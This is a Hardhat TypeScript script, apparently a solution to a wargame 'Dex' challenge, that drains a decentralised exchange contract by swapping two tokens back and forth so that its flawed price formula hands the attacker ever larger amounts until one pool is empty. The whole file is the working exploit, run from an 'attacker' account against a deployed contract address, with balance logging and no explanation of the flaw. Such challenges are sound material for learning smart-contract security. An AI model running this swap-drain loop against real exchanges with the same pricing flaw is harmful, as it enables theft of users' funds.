import { ethers, network } from "hardhat";
import { Dex } from "../typechain-types";

async function main() {
  let dex: Dex;

  const [attacker] = await ethers.getSigners();
  const chainId = network.config.chainId;

  const isLocalTest = chainId === 31337;

  if (isLocalTest) {
    dex = await ethers.getContract("Dex");
  } else {
    dex = await ethers.getContractAt(
      "Dex",
      "0x657C2bE5232c91176738E67dfA073703423b158a"
    );
  }

  const token1 = await dex.token1();
  const token2 = await dex.token2();

  let from = token1;
  let to = token2;

  // approve and swap
  const txApprove = await dex.connect(attacker).approve(dex.address, 110);
  await txApprove.wait(isLocalTest ? 1 : 5);
  console.log("Approve tx: ", txApprove.hash);

  while (true) {
    const token1Balance = await dex.balanceOf(token1, attacker.address);
    const token2Balance = await dex.balanceOf(token2, attacker.address);

    console.log("------------------");

    console.log("Attacker token1 balance: ", token1Balance.toString());
    console.log("Attacker token2 balance: ", token2Balance.toString());

    // dex balances
    const dexToken1Balance = await dex.balanceOf(token1, dex.address);
    const dexToken2Balance = await dex.balanceOf(token2, dex.address);

    console.log("Dex token1 balance: ", dexToken1Balance.toString());
    console.log("Dex token2 balance: ", dexToken2Balance.toString());

    // switch from and to
    [from, to] = [to, from];

    // attacker balance from balance
    const attackerFromBalance = await dex.balanceOf(from, attacker.address);
    // to dex balance
    const dexFromBalance = await dex.balanceOf(from, dex.address);

    console.log("------------------");
    console.log("Attacker from balance: ", attackerFromBalance.toString());
    console.log("Dex from balance: ", dexFromBalance.toString());

    const swapAmount = attackerFromBalance.lt(dexFromBalance)
      ? attackerFromBalance
      : dexFromBalance;

    console.log("Swap amount: ", swapAmount.toString());

    // skip if swap amount is 0
    if (swapAmount.eq(0)) {
      console.log("Skipped!");
      continue;
    }

    if (dexToken1Balance.eq(0) || dexToken2Balance.eq(0)) {
      console.log("Dex is empty!");
      break;
    }

    const tx = await dex.connect(attacker).swap(from, to, swapAmount);
    console.log("Swap tx: ", tx.hash);
    await tx.wait(isLocalTest ? 1 : 5);
  }

  // contract tokens balances
  const dexToken1Balance = await dex.balanceOf(token1, dex.address);
  const dexToken2Balance = await dex.balanceOf(token2, dex.address);

  console.log("Dex token1 balance: ", dexToken1Balance.toString());
  console.log("Dex token2 balance: ", dexToken2Balance.toString());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
